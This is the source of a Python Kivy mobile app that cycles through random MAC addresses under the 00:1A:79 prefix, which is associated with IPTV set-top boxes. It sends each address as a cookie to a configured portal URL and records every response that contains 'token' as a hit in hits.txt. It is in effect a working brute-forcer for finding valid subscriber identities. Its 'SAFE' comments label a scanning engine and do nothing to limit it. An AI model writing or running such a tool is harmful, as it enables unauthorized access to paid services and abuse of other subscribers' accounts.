from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
from kivy.properties import StringProperty

import threading
import queue
import requests
import random
import certifi
import os
import time


# ─────────────────────────────
# SAFE STORAGE
# ─────────────────────────────
try:
    from android.storage import app_storage_path
    STORAGE = app_storage_path()
except:
    STORAGE = os.getcwd()


# ─────────────────────────────
# CORE ENGINE (SAFE)
# ─────────────────────────────
class Engine:

    def __init__(self, ui):
        self.ui = ui
        self.q = queue.Queue()
        self.running = False
        self.session = requests.Session()

    def start(self, config):
        self.running = True
        threading.Thread(target=self.worker, args=(config,), daemon=True).start()

    def stop(self):
        self.running = False

    def worker(self, config):

        start = int(config["start"], 16)
        end = int(config["end"], 16)

        while self.running:

            val = random.randint(start, end)
            mac = f"{config['prefix']}:{val:06X}"

            self.process(mac, config)

            time.sleep(0.05)

    def process(self, mac, config):

        try:
            r = self.session.get(
                config["url"],
                cookies={"mac": mac},
                timeout=config["timeout"],
                verify=certifi.where()
            )

            if "token" in r.text.lower():
                self.ui.update(mac, "hit")
            else:
                self.ui.update(mac, "miss")

        except:
            self.ui.update(mac, "error")


# ─────────────────────────────
# UI
# ─────────────────────────────
class Root(BoxLayout):

    status = StringProperty("IDLE")
    total = StringProperty("0")
    hits = StringProperty("0")
    errors = StringProperty("0")

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.engine = Engine(self)

    def start(self):
        config = {
            "url": "http://example.com",
            "prefix": "00:1A:79",
            "start": "000000",
            "end": "0FFFFF",
            "timeout": 5
        }

        self.total = "0"
        self.hits = "0"
        self.errors = "0"

        self.status = "RUNNING"
        self.engine.start(config)

    def stop(self):
        self.status = "STOPPED"
        self.engine.stop()

    def update(self, mac, status):

        self.total = str(int(self.total) + 1)

        if status == "hit":
            self.hits = str(int(self.hits) + 1)
            self.save(mac)

        elif status == "error":
            self.errors = str(int(self.errors) + 1)

    def save(self, mac):
        path = os.path.join(STORAGE, "hits.txt")
        with open(path, "a") as f:
            f.write(mac + "\n")


# ─────────────────────────────
# APP
# ─────────────────────────────
class MyApp(App):

    def build(self):
        return Root()


if __name__ == "__main__":
    MyApp().run()
